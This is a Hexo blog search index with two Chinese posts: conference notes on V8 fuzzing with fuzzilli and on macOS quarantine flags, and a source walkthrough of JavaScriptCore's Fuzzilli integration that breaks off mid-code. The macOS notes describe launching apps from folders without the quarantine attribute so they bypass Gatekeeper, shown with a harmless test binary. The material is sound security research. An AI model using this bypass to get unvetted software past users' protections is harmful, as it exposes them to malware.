<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>Xcon&amp;Kcon</title>
    <link href="/2024/08/30/Xcon-Kcon/"/>
    <url>/2024/08/30/Xcon-Kcon/</url>
    
    <content type="html"><![CDATA[<h1 id="Xcon-Kcon"><a href="#Xcon-Kcon" class="headerlink" title="Xcon&amp;Kcon"></a>Xcon&amp;Kcon</h1><p>本次会议主要关注两个议题，一个是TheDog师傅讲的fuzzilli和V8，另一个是京东的李中权大佬讲的mac。</p><h2 id="V8"><a href="#V8" class="headerlink" title="V8"></a>V8</h2><p>V8是Google Chrome浏览器的引擎，这里主要关注对fuzzilli改进的思路。</p><h3 id="随机性和正确性"><a href="#随机性和正确性" class="headerlink" title="随机性和正确性"></a>随机性和正确性</h3><p>Fuzzer需要在正确性和随机性二者之间进行按权重取舍，如果正确性很高将会导致Fuzzer的样本空间过于受限，如果随机性太强，将会导致产生很多无效的样本。一般我们将Fuzzer的正确率控制在50%左右。</p><h3 id="fuzzilli的改进"><a href="#fuzzilli的改进" class="headerlink" title="fuzzilli的改进"></a>fuzzilli的改进</h3><h4 id="扩展语料"><a href="#扩展语料" class="headerlink" title="扩展语料"></a>扩展语料</h4><p>由于js的标准不断更新，可能会产生新的特性，原有的fuzzilli生成的样本就不会包含这部分新特性。可以通过扩展语料生成以包含这部分特性，比如下面的Module和new builtins部分。</p><p>​</p><p><img src="/2024/08/30/Xcon-Kcon/image-20240827210830902.png"></p><p>​</p><h4 id="覆盖率"><a href="#覆盖率" class="headerlink" title="覆盖率"></a>覆盖率</h4><p> 目前大部分Fuzzer是以覆盖率为引导的，如果一个样本执行到了新的边，则认为该样本是优质的。这就会依赖覆盖率收集的准确性，这里提到v8在覆盖率收集方面遇到了小问题。</p><p> 我们需要先注意常规的利用编译器插桩来收集代码的覆盖率只能是针对cpp代码，对于自定义语言实现的功能部分可能无法收集到覆盖率信息，这里比如V8中的Torque，接着就会引出CSA和TuboFan</p><h5 id="TuboFan"><a href="#TuboFan" class="headerlink" title="TuboFan"></a>TuboFan</h5><p>TurboFan 是 V8 JavaScript 引擎中的一个优化编译器，它在 2015 年首次被介绍 。它结合了先进的中间表示（Intermediate Representation, IR）和多层次的翻译及优化流水线，以生成比之前的 CrankShaft JIT 更高质量的机器代码。</p><h5 id="CSA"><a href="#CSA" class="headerlink" title="CSA"></a>CSA</h5><p> CodeStubAssembler，或简称 CSA。CSA是V8的一个组件，它允许我们直接用C ++编写低级别的TurboFan IR（TurboFan 中间层），后来用TurboFan的后端（编译器后端）将其合理结构的机器码。</p><p>CSA被大量应用于为JavaScript内置函数编写所谓的“快速路径”。内置的“快速路径”版本通常检查某些特别的条件是否成立（例如原型链上没有元素，没有访问器等），然后使用更快，更特殊优化的操作来实现内置函数的功能。这可以使函数执行时间比通用版本快一个数量级。</p><p>CSA的缺点是它确实可以被认为是汇编语言。流程控制使用明确的 <code>label</code> 和 <code>goto</code>进行建模，这使得在CSA中实现复杂算法时，代码会难以阅读且容易出错。</p><h5 id="Torque"><a href="#Torque" class="headerlink" title="Torque"></a>Torque</h5><p>Torque是一种领域专用语言，具有类似TypeScript的语法，目前使用CSA作为其唯一的编译目标。Torque允许开发者使用与CSA几乎相同层次的流程控制操作，同时提供更高级别的构造，例如while和for循环。</p><h5 id="CFG"><a href="#CFG" class="headerlink" title="CFG"></a>CFG</h5><p>CFG是“控制流图”（Control Flow Graph）的缩写，这是一种程序分析技术，用于表示程序中所有可能的执行路径。CFG由节点（通常代表程序中的语句或指令）和边（代表控制流的转移）组成。CFG的目的是提供一个清晰的视图，展示程序在执行过程中可能遵循的所有路径。在控制流图（CFG）的上下文中，指令选择（Instruction Selection）通常是指编译过程中的一个步骤，其中编译器决定如何将高级语言或中间表示（IR）转换成目标机器的汇编指令。这个过程也被称作“后端”（backend）编译过程的一部分。</p><p>在看完上面的相关介绍后，看下下面这张图：</p><p>正常由编译器进行插桩收集覆盖率信息会导致Torque写的部分覆盖率信息无法被收集到</p><p><img src="/2024/08/30/Xcon-Kcon/image-20240827224250369.png"></p><p>下面关于CSACoverageInstrument还不太熟悉</p><p><img src="/2024/08/30/Xcon-Kcon/image-20240827224420437.png"></p><blockquote><p>CSA：<a href="https://v8.dev/blog/csa">Taming architecture complexity in V8 — the CodeStubAssembler · V8</a></p></blockquote><blockquote></blockquote><blockquote><p>Torque：<a href="https://juejin.cn/post/6844903765707866119#heading-5">[译]V8引擎中的排序Array.prototype.sort 是V8引擎中最后一批采用JavaScript自托管实现的 - 掘金 (juejin.cn)</a></p></blockquote><blockquote></blockquote><blockquote><p>TuboFan：<a href="https://zhuanlan.zhihu.com/p/688351816">[V8引擎]解释器和编译器（JavaScript是如何工作的） - 知乎 (zhihu.com)</a></p></blockquote><h4 id="其他方面"><a href="#其他方面" class="headerlink" title="其他方面"></a>其他方面</h4><h5 id="度量指标"><a href="#度量指标" class="headerlink" title="度量指标"></a>度量指标</h5><p>大部分Fuzzer是以覆盖率作为评估样本优劣的指标，样本是否优劣是人们划分的，比如我们可以将简单可行、可能发现漏洞这种特征作为指标来指导Fuzzer。我认为可以根据具体场景来指定特定的指标来引导或许有奇效。</p><h5 id="漏洞检测"><a href="#漏洞检测" class="headerlink" title="漏洞检测"></a>漏洞检测</h5><p>这部分主要提到 Address Sanitizer 和 差分测试。</p><p>Address Sanitizer很明显的缺点就是速度比较慢，而且面对浏览器自己编写的堆分配方式，大部分检测会失效，因为原生的主要面对系统上的标准库。</p><p>差分测试的缺点就是误报比较多，差分测试是将解释执行和优化后执行的效果进行比对</p><h5 id="稳定性"><a href="#稳定性" class="headerlink" title="稳定性"></a>稳定性</h5><p>同一个样本执行两次如果触发的边是一致的我们可以称之为稳定。在fuzzilli中我们也会看到如果发现一个crash，它会再次执行来验证效果是否相同。fuzzilli是利用REPRL机制来执行，优点就是速度很快，因为不用重复起进程，这样或许会对样本的执行产生影响，TheDog又加入一个ForkServer机制用来创建一个新的进程去执行样本以提供全新的执行状态。</p><p>我觉得或许可以在发现crash再次执行验证时，可以用全新的执行状态去验证，以消除不必要的影响。</p><h3 id="当前的问题"><a href="#当前的问题" class="headerlink" title="当前的问题"></a>当前的问题</h3><p>上面也提到度量指标的问题，现在就是缺乏一个不同的评估指标来发现优秀的样本</p><p>另外一个就是 Address Sanitizer，TheDog提到缺一个GC使用的Address Sanitizerr</p><h3 id="以后的方向"><a href="#以后的方向" class="headerlink" title="以后的方向"></a>以后的方向</h3><p>后面算力是越来越强了，单打独斗的Fuzzer有点吃力，如果能借助算力实施分布式fuzz将会大大提升效率；</p><p>神经网络方面，在生成模型方面，或许可以借助神经网络来生成样本</p><h2 id="MacOS安全"><a href="#MacOS安全" class="headerlink" title="MacOS安全"></a>MacOS安全</h2><h3 id="macOS上的保护"><a href="#macOS上的保护" class="headerlink" title="macOS上的保护"></a>macOS上的保护</h3><ul><li>SIP：rootless</li></ul><p>​旨在帮助防止潜在的恶意软件修改 Mac 上受保护的文件和文件夹。系统完整性保护限制 root 用户帐户并限制 root 用户可以对 Mac 操作系统受保护部分执行的操作。在系统完整性保护（在 OS X El Capitan 中引入）之前，root 用户没有权限限制，因此它可以访问 Mac 上的任何系统文件夹或应用程序。当您输入管理员名称和密码来安装软件时，软件获得根级访问权限。这使得该软件可以修改或覆盖任何系统文件或应用程序。</p><p>​在macOS中，CSR通常指的是“System Integrity Protection”的缩写形式，具体指的是用于管理SIP状态的命令行工具 csrutil，csrutil status可以查看SIP的当前状态。</p><p>​</p><p>​<img src="/2024/08/30/Xcon-Kcon/image-20240829212429375.png"></p><p>​</p><ul><li>TCC</li></ul><p>​这个是管理APP权限的一个数据库，比如我们正常使用APP时需要某一权限会第一时间弹窗给用户，用户授权通过后才能使用对应的权限，权限是存储在TCC.db中。</p><p>​</p><h3 id="Quarantine属性"><a href="#Quarantine属性" class="headerlink" title="Quarantine属性"></a>Quarantine属性</h3><h4 id="第一部分：关于不带隔离属性的文件夹"><a href="#第一部分：关于不带隔离属性的文件夹" class="headerlink" title="第一部分：关于不带隔离属性的文件夹"></a>第一部分：关于不带隔离属性的文件夹</h4><p>主要分为两步：下面主要是第一步的相关工作，首先验证不带隔离属性的文件夹能够绕过检查直接启动，然后可以利用一个CVE来创建这样的一个文件夹。</p><p><img src="/2024/08/30/Xcon-Kcon/image-20240829235000090.png"></p><h4 id="com-apple-quarantine"><a href="#com-apple-quarantine" class="headerlink" title="com.apple.quarantine"></a>com.apple.quarantine</h4><p>之前提到过gatekeeper检测从互联网上下载的软件，在macOS中还有一种安全特性Quarantine，这个是以扩展属性com.apple.quarantine的形式来标记文件是否处于隔离状态。</p><p>我们可以使用<code>xattr -l</code>来查看文件的所有扩展属性和值：</p><p><img src="/2024/08/30/Xcon-Kcon/image-20240829213001076.png"></p><p>下面是qtn_<em>flags：0x1是标记为下载，0x2是标记为隔离，0x4是标记为最严格的监管，0x40是标记为用户已授权</em></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs C"><br><span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">qtn_flags</span> &#123;</span><br><br>  QTN_FLAG_DOWNLOAD = <span class="hljs-number">0x0001</span>,<br><br>  QTN_FLAG_SANDBOX = <span class="hljs-number">0x0002</span>,<br><br>  QTN_FLAG_HARD = <span class="hljs-number">0x0004</span>,<br><br>  QTN_FLAG_USER_APPROVED = <span class="hljs-number">0x0040</span>,<br><br>&#125;;<br><br></code></pre></td></tr></table></figure><p>如果利用Safari从互联网下载文件，该文件的隔离属性如下：</p><p><img src="/2024/08/30/Xcon-Kcon/image-20240829213429134.png"></p><h4 id="从被隔离到启动"><a href="#从被隔离到启动" class="headerlink" title="从被隔离到启动"></a>从被隔离到启动</h4><p>如果尝试启动隔离的应用程序，Gatekeeper将会阻止其启动。想要启动就需要通过设置进入Privacy &amp; Security中，通过输入管理员密码点击Open Anyway来进而可以启动。</p><p>下面是被Gatekeeper阻止启动，仅给了一个移到垃圾箱的选项：</p><p><img src="/2024/08/30/Xcon-Kcon/image-20240829213718615.png"></p><p>从设置中允许此次打开：</p><p><img src="/2024/08/30/Xcon-Kcon/image-20240829214025301.png"></p><p>允许后再打开app还会弹窗，这里显示了Open选项：</p><p><img src="/2024/08/30/Xcon-Kcon/image-20240829214106126.png"></p><p>我们打开app后，再看下隔离属性：此时已经变为0xc3，<code>syspolicyd</code> 给原来的quarantine 标志加上了<code>0x40</code> </p><p><img src="/2024/08/30/Xcon-Kcon/image-20240829214219681.png"></p><p>下次用户再启动此app时，<code>syspolicyd</code> 将不会阻止启动（quarantine 标志中已经包含0x40）：</p><p><img src="/2024/08/30/Xcon-Kcon/image-20240829214614867.png"></p><p><img src="/2024/08/30/Xcon-Kcon/image-20240829214626511.png"></p><h4 id="关于0x86"><a href="#关于0x86" class="headerlink" title="关于0x86"></a>关于0x86</h4><p>下面验证了如果创建一个不带隔离属性的文件夹，就可以直接启动一个可执行文件（前提可执行文件非86）：</p><p>上面可以看到<code>xattr -l hello.app</code> 指令的结果是出现quarantine属性，hello.app本身就是一个文件夹，说明此文件夹带隔离属性。下面是想着先去掉文件夹的隔离属性，然后试着能否越过沙箱：</p><p><img src="/2024/08/30/Xcon-Kcon/image-20240829220340311.png"></p><p>自己试了下效果：</p><p>下面是hello.cpp用于编译hello可执行文件，这里为了验证是否启动而加入了sleep函数，然后用<code>ps -e | grep hello </code> 来查看是否启动</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs C++"><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;iostream&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;unistd.h&gt;</span></span><br><br><span class="hljs-keyword">using</span> std::cout;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br><br>​cout&lt;&lt;<span class="hljs-string">&quot;hello!!!&quot;</span>&lt;&lt;std::endl;<br><br>​<span class="hljs-built_in">sleep</span>(<span class="hljs-number">20</span>);<br><br>​<span class="hljs-keyword">return</span> <span class="hljs-number">1337</span>;<br><br>&#125;<br><br></code></pre></td></tr></table></figure><p><img src="/2024/08/30/Xcon-Kcon/image-20240829223330746.png"></p><p>在上面运行.&#x2F;hello.app时，通过观察进程发现app成功启动了：</p><p><img src="/2024/08/30/Xcon-Kcon/image-20240829223446600.png"></p><p>如果隔离标志换为86执行就会失败：</p><p><img src="/2024/08/30/Xcon-Kcon/image-20240829220310640.png"></p><p>这里也是验证了一下：</p><p><img src="/2024/08/30/Xcon-Kcon/image-20240829225256905.png"></p><p>目前情况就是隔离标志为86就是执行失败，非86执行成功。</p><p>下面是隔离标志的生成过程：</p><blockquote><p>如果输入标志不包含 <code>0x40</code> 并且最低两位非零，则将添加 <code>0x80</code> 标志：</p></blockquote><blockquote></blockquote><blockquote><p>最终隔离标志 &#x3D; Input_Flag | 0x80</p></blockquote><p><img src="/2024/08/30/Xcon-Kcon/image-20240829225502064.png"></p><p>结合上面提到的相关标志位，能结合出以下组合：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs C"><br><span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">qtn_flags</span> &#123;</span><br><br>  QTN_FLAG_DOWNLOAD = <span class="hljs-number">0x0001</span>,<br><br>  QTN_FLAG_SANDBOX = <span class="hljs-number">0x0002</span>,<br><br>  QTN_FLAG_HARD = <span class="hljs-number">0x0004</span>,<br><br>  QTN_FLAG_USER_APPROVED = <span class="hljs-number">0x0040</span>,<br><br>&#125;;<br><br>quarantine flag <span class="hljs-number">0081</span> : QTN_FLAG_DOWNLOAD<br><br>quarantine flag <span class="hljs-number">0082</span> : QTN_FLAG_SANDBOX<br><br>quarantine flag <span class="hljs-number">0083</span> : QTN_FLAG_SANDBOX + QTN_FLAG_DOWNLOAD<br><br>quarantine flag <span class="hljs-number">0086</span> : QTN_FLAG_SANDBOX + QTN_FLAG_HARD<br><br></code></pre></td></tr></table></figure><p>针对隔离标志为86的应用程序，由于它未经授权，用户只有一个选择即将应用移至垃圾箱，而且系统还禁用了Open Anyway选项</p><p><img src="/2024/08/30/Xcon-Kcon/image-20240829225900977.png"></p><h4 id="第二部分：关于更改文件的隔离标志"><a href="#第二部分：关于更改文件的隔离标志" class="headerlink" title="第二部分：关于更改文件的隔离标志"></a>第二部分：关于更改文件的隔离标志</h4><p>然后第二部分的工作主要是想办法更改某个文件的quarantine标志</p><p>从以下四个路线分别做了尝试：</p><p><img src="/2024/08/30/Xcon-Kcon/image-20240830000836410.png"></p><p>后续接着分析</p><blockquote><p><a href="https://imlzq.com/apple/macos/2024/08/24/Unveiling-Mac-Security-A-Comprehensive-Exploration-of-TCC-Sandboxing-and-App-Data-TCC.html#29-0082-routes">揭秘 Mac 安全性：沙盒和 AppData TCC 的全面探索 |李忠全的博客 — Unveiling Mac Security: A Comprehensive Exploration of Sandboxing and AppData TCC | Zhongquan Li’s blogs (imlzq.com)</a></p></blockquote>]]></content>
    
    
    <categories>
      
      <category>MacOS</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Fuzilli源码解析3</title>
    <link href="/2024/06/08/Fuzilli%E6%BA%90%E7%A0%81%E8%A7%A3%E6%9E%903/"/>
    <url>/2024/06/08/Fuzilli%E6%BA%90%E7%A0%81%E8%A7%A3%E6%9E%903/</url>
    
    <content type="html"><![CDATA[<h1 id="JSC和Fuzzilli如何配合的"><a href="#JSC和Fuzzilli如何配合的" class="headerlink" title="JSC和Fuzzilli如何配合的"></a>JSC和Fuzzilli如何配合的</h1><h2 id="JSC中"><a href="#JSC中" class="headerlink" title="JSC中"></a>JSC中</h2><h3 id="参数解析"><a href="#参数解析" class="headerlink" title="参数解析"></a>参数解析</h3><p>下面是<code>wtf/NeverDestroyed.h</code>中定义的一个类：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><code class="hljs C++"><span class="hljs-comment">// <span class="hljs-doctag">FIXME:</span> It&#x27;s messy to have to repeat the whole class just to make this &quot;lazy&quot; version.</span><br><span class="hljs-comment">// Should revisit clients to see if we really need this, and perhaps use templates to</span><br><span class="hljs-comment">// share more of the code with the main NeverDestroyed above.</span><br><span class="hljs-keyword">template</span>&lt;<span class="hljs-keyword">typename</span> T, <span class="hljs-keyword">typename</span> AccessTraits&gt; <span class="hljs-keyword">class</span> <span class="hljs-title class_">LazyNeverDestroyed</span> &#123;<br>    <span class="hljs-built_in">WTF_MAKE_NONCOPYABLE</span>(LazyNeverDestroyed);<br>    WTF_FORBID_HEAP_ALLOCATION;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-built_in">LazyNeverDestroyed</span>() = <span class="hljs-keyword">default</span>;<br><br>    <span class="hljs-function"><span class="hljs-keyword">template</span>&lt;<span class="hljs-keyword">typename</span>... Args&gt;</span><br><span class="hljs-function">    <span class="hljs-type">void</span> <span class="hljs-title">construct</span><span class="hljs-params">(Args&amp;&amp;... args)</span></span><br><span class="hljs-function">    </span>&#123;<br>        AccessTraits::<span class="hljs-built_in">assertAccess</span>();<br>        <span class="hljs-built_in">constructWithoutAccessCheck</span>(std::forward&lt;Args&gt;(args)...);<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">template</span>&lt;<span class="hljs-keyword">typename</span>... Args&gt;</span><br><span class="hljs-function">    <span class="hljs-type">void</span> <span class="hljs-title">constructWithoutAccessCheck</span><span class="hljs-params">(Args&amp;&amp;... args)</span></span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-built_in">ASSERT</span>(!m_isConstructed);<br><span class="hljs-meta">#<span class="hljs-keyword">if</span> ASSERT_ENABLED</span><br>        m_isConstructed = <span class="hljs-literal">true</span>;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>        <span class="hljs-built_in">MaybeRelax</span>&lt;T&gt;(<span class="hljs-built_in">new</span> (<span class="hljs-built_in">storagePointerWithoutAccessCheck</span>()) <span class="hljs-built_in">T</span>(std::forward&lt;Args&gt;(args)...));<br>    &#125;<br><br>    <span class="hljs-keyword">operator</span> T&amp;() &#123; <span class="hljs-keyword">return</span> *<span class="hljs-built_in">storagePointer</span>(); &#125;<br>    <span class="hljs-function">T&amp; <span class="hljs-title">get</span><span class="hljs-params">()</span> </span>&#123; <span class="hljs-keyword">return</span> *<span class="hljs-built_in">storagePointer</span>(); &#125;<br><br>    T* <span class="hljs-keyword">operator</span>-&gt;() &#123; <span class="hljs-keyword">return</span> <span class="hljs-built_in">storagePointer</span>(); &#125;<br><br>    <span class="hljs-keyword">operator</span> <span class="hljs-type">const</span> T&amp;() <span class="hljs-type">const</span> &#123; <span class="hljs-keyword">return</span> *<span class="hljs-built_in">storagePointer</span>(); &#125;<br>    <span class="hljs-function"><span class="hljs-type">const</span> T&amp; <span class="hljs-title">get</span><span class="hljs-params">()</span> <span class="hljs-type">const</span> </span>&#123; <span class="hljs-keyword">return</span> *<span class="hljs-built_in">storagePointer</span>(); &#125;<br><br>    <span class="hljs-type">const</span> T* <span class="hljs-keyword">operator</span>-&gt;() <span class="hljs-type">const</span> &#123; <span class="hljs-keyword">return</span> <span class="hljs-built_in">storagePointer</span>(); &#125;<br><br><span class="hljs-meta">#<span class="hljs-keyword">if</span> ASSERT_ENABLED</span><br>    <span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">isConstructed</span><span class="hljs-params">()</span> <span class="hljs-type">const</span> </span>&#123; <span class="hljs-keyword">return</span> m_isConstructed; &#125;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br><span class="hljs-keyword">private</span>:<br>    <span class="hljs-keyword">using</span> PointerType = <span class="hljs-keyword">typename</span> std::remove_const&lt;T&gt;::type*;<br><br>    <span class="hljs-function">PointerType <span class="hljs-title">storagePointerWithoutAccessCheck</span><span class="hljs-params">()</span> <span class="hljs-type">const</span></span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-built_in">ASSERT</span>(m_isConstructed);<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">const_cast</span>&lt;PointerType&gt;(<span class="hljs-built_in">reinterpret_cast</span>&lt;<span class="hljs-type">const</span> T*&gt;(&amp;m_storage));<br>    &#125;<br><br>    <span class="hljs-function">PointerType <span class="hljs-title">storagePointer</span><span class="hljs-params">()</span> <span class="hljs-type">const</span></span><br><span class="hljs-function">    </span>&#123;<br>        AccessTraits::<span class="hljs-built_in">assertAccess</span>();<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">storagePointerWithoutAccessCheck</span>();<br>    &#125;<br><br>    <span class="hljs-keyword">template</span>&lt;<span class="hljs-keyword">typename</span> PtrType, <span class="hljs-type">bool</span> ShouldRelax = std::is_base_of&lt;RefCountedBase, PtrType&gt;::value&gt; <span class="hljs-keyword">struct</span> MaybeRelax &#123;<br>        <span class="hljs-keyword">explicit</span> <span class="hljs-built_in">MaybeRelax</span>(PtrType*) &#123; &#125;<br>    &#125;;<br>    <span class="hljs-keyword">template</span>&lt;<span class="hljs-keyword">typename</span> PtrType&gt; <span class="hljs-keyword">struct</span> <span class="hljs-title class_">MaybeRelax</span>&lt;PtrType, <span class="hljs-literal">true</span>&gt; &#123;<br>        <span class="hljs-function"><span class="hljs-keyword">explicit</span> <span class="hljs-title">MaybeRelax</span><span class="hljs-params">(PtrType* ptr)</span> </span>&#123; ptr-&gt;<span class="hljs-built_in">relaxAdoptionRequirement</span>(); &#125;<br>    &#125;;<br><br><span class="hljs-meta">#<span class="hljs-keyword">if</span> ASSERT_ENABLED</span><br>    <span class="hljs-comment">// LazyNeverDestroyed objects are always static, so this variable is initialized to false.</span><br>    <span class="hljs-comment">// It must not be initialized dynamically; that would not be thread safe.</span><br>    <span class="hljs-type">bool</span> m_isConstructed;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br>    <span class="hljs-comment">// <span class="hljs-doctag">FIXME:</span> Investigate whether we should allocate a hunk of virtual memory</span><br>    <span class="hljs-comment">// and hand out chunks of it to NeverDestroyed instead, to reduce fragmentation.</span><br>    <span class="hljs-keyword">typename</span> std::aligned_storage&lt;<span class="hljs-built_in">sizeof</span>(T), std::alignment_of&lt;T&gt;::value&gt;::type m_storage;<br>&#125;;<br></code></pre></td></tr></table></figure><p>在<code>jsc.cpp</code>中定义了<code>CommandLine</code>类，并且还定义了一个<code>LazyNeverDestroyed&lt;CommandLine&gt;</code>静态对象<code>mainCommandLine</code>，可以看到在其构造函数中调用了<code>parseArguments</code>：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs C++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">CommandLine</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-built_in">CommandLine</span>(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span>** argv)<br>    &#123;<br>        <span class="hljs-built_in">parseArguments</span>(argc, argv);<br>    &#125;<br><br>    <span class="hljs-keyword">enum</span> <span class="hljs-title class_">CommandLineForWorkersTag</span> &#123; CommandLineForWorkers &#125;;<br>    <span class="hljs-function"><span class="hljs-keyword">explicit</span> <span class="hljs-title">CommandLine</span><span class="hljs-params">(CommandLineForWorkersTag)</span></span>;<br><br>    Vector&lt;Script&gt; m_scripts;<br>    Vector&lt;String&gt; m_arguments;<br>    String m_profilerOutput;<br>    String m_uncaughtExceptionName;<br>    <span class="hljs-type">bool</span> m_interactive &#123; <span class="hljs-literal">false</span> &#125;;<br>    <span class="hljs-type">bool</span> m_reprl &#123; <span class="hljs-literal">false</span> &#125;;<br>    <span class="hljs-type">bool</span> m_dump &#123; <span class="hljs-literal">false</span> &#125;;<br>    <span class="hljs-type">bool</span> m_module &#123; <span class="hljs-literal">false</span> &#125;;<br>    <span class="hljs-type">bool</span> m_exitCode &#123; <span class="hljs-literal">false</span> &#125;;<br>    <span class="hljs-type">bool</span> m_destroyVM &#123; <span class="hljs-literal">false</span> &#125;;<br>    <span class="hljs-type">bool</span> m_treatWatchdogExceptionAsSuccess &#123; <span class="hljs-literal">false</span> &#125;;<br>    <span class="hljs-type">bool</span> m_alwaysDumpUncaughtException &#123; <span class="hljs-literal">false</span> &#125;;<br>    <span class="hljs-type">bool</span> m_dumpMemoryFootprint &#123; <span class="hljs-literal">false</span> &#125;;<br>    <span class="hljs-type">bool</span> m_dumpLinkBufferStats &#123; <span class="hljs-literal">false</span> &#125;;<br>    <span class="hljs-type">bool</span> m_dumpSamplingProfilerData &#123; <span class="hljs-literal">false</span> &#125;;<br>    <span class="hljs-type">bool</span> m_enableRemoteDebugging &#123; <span class="hljs-literal">false</span> &#125;;<br>    <span class="hljs-type">bool</span> m_canBlockIsFalse &#123; <span class="hljs-literal">false</span> &#125;;<br><br>    <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">parseArguments</span><span class="hljs-params">(<span class="hljs-type">int</span>, <span class="hljs-type">char</span>**)</span></span>;<br>&#125;;<br><span class="hljs-type">static</span> LazyNeverDestroyed&lt;CommandLine&gt; mainCommandLine;<br></code></pre></td></tr></table></figure><p>看下<code>parseArguments</code>函数的部分代码，主要解析参数根据不同的参数来设置，比如下面关注<code>--reprl</code>选项，<code>m_scripts</code>是一个向量，<code>--reprl</code>向其中加入一个<code>Script</code>对象并且<code>CodeSource</code>是<code>Script::CodeSource::REPRL</code>：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span 